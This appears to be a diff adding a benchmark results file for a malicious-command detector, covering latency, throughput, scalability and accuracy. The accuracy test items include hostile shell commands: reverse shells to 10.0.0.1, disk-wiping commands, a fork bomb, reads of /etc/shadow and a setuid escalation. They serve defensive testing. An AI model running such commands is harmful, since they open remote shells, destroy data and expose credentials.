@@ -1,0 +1,211 @@
+{
+  "latency": {
+    "min_us": 944.74,
+    "max_us": 2270.808,
+    "mean_us": 1223.362629,
+    "median_us": 1212.6399999999999,
+    "p90_us": 1392.149,
+    "p95_us": 1477.241,
+    "p99_us": 1658.725,
+    "p999_us": 2270.808,
+    "stddev_us": 143.68403065868415,
+    "samples": 1000
+  },
+  "throughput": {
+    "events_per_second": 1615.5294598986484,
+    "bytes_per_second": 0,
+    "peak_eps": 1746.4405424649092,
+    "sustained_eps": 1616.9548262548867
+  },
+  "scalability": {
+    "100": {
+      "target_rate": 100,
+      "actual_rate": 92.3,
+      "latency_stats": {
+        "min_us": 527.811,
+        "max_us": 1842.418,
+        "mean_us": 774.9902253521127,
+        "median_us": 750.036,
+        "p90_us": 928.079,
+        "p95_us": 988.091,
+        "p99_us": 1269.547,
+        "p999_us": 1842.418,
+        "stddev_us": 128.8724395718357,
+        "samples": 923
+      },
+      "drop_rate": 7.700000000000003
+    },
+    "500": {
+      "target_rate": 500,
+      "actual_rate": 366.9,
+      "latency_stats": {
+        "min_us": 498.211,
+        "max_us": 2285.607,
+        "mean_us": 666.1563216135187,
+        "median_us": 644.333,
+        "p90_us": 771.596,
+        "p95_us": 840.497,
+        "p99_us": 1014.971,
+        "p999_us": 1523.472,
+        "stddev_us": 99.21320601892732,
+        "samples": 3669
+      },
+      "drop_rate": 26.620000000000005
+    },
+    "1000": {
+      "target_rate": 1000,
+      "actual_rate": 586.4,
+      "latency_stats": {
+        "min_us": 477.15,
+        "max_us": 2152.085,
+        "mean_us": 646.1875083560709,
+        "median_us": 632.1285,
+        "p90_us": 749.286,
+        "p95_us": 821.227,
+        "p99_us": 981.441,
+        "p999_us": 1690.136,
+        "stddev_us": 105.67275527764102,
+        "samples": 5864
+      },
+      "drop_rate": 41.36
+    },
+    "2000": {
+      "target_rate": 2000,
+      "actual_rate": 835.5,
+      "latency_stats": {
+        "min_us": 478.43,
+        "max_us": 2487.152,
+        "mean_us": 638.3824190305206,
+        "median_us": 625.093,
+        "p90_us": 743.985,
+        "p95_us": 808.157,
+        "p99_us": 953.42,
+        "p999_us": 1617.444,
+        "stddev_us": 104.07211215257894,
+        "samples": 8355
+      },
+      "drop_rate": 58.225
+    }
+  },
+  "accuracy": {
+    "true_positives": 9,
+    "false_positives": 0,
+    "true_negatives": 4,
+    "false_negatives": 2,
+    "details": [
+      {
+        "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+        "category": "reverse_shell",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "nc -e /bin/sh 10.0.0.1 4444",
+        "category": "reverse_shell",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "python -c 'import socket'",
+        "category": "reverse_shell",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "rm -rf /",
+        "category": "destructive",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "dd if=/dev/zero of=/dev/sda",
+        "category": "destructive",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": ":(){ :|:& };:",
+        "category": "fork_bomb",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "cat /etc/passwd",
+        "category": "info_gathering",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "cat /etc/shadow",
+        "category": "info_gathering",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "whoami",
+        "category": "info_gathering",
+        "expected": true,
+        "detected": false,
+        "correct": false
+      },
+      {
+        "command": "sudo -l",
+        "category": "priv_esc",
+        "expected": true,
+        "detected": false,
+        "correct": false
+      },
+      {
+        "command": "chmod +s /bin/bash",
+        "category": "priv_esc",
+        "expected": true,
+        "detected": true,
+        "correct": true
+      },
+      {
+        "command": "ls -la",
+        "category": "normal",
+        "expected": false,
+        "detected": false,
+        "correct": true
+      },
+      {
+        "command": "pwd",
+        "category": "normal",
+        "expected": false,
+        "detected": false,
+        "correct": true
+      },
+      {
+        "command": "date",
+        "category": "normal",
+        "expected": false,
+        "detected": false,
+        "correct": true
+      },
+      {
+        "command": "echo hello",
+        "category": "normal",
+        "expected": false,
+        "detected": false,
+        "correct": true
+      }
+    ],
+    "precision": 1.0,
+    "recall": 0.8181818181818182,
+    "f1_score": 0.9
+  },
+  "resources": {
+    "cpu_percent": 11.465,
+    "memory_mb": 19.046875,
+    "memory_peak_mb": 19.05078125
+  }
+}
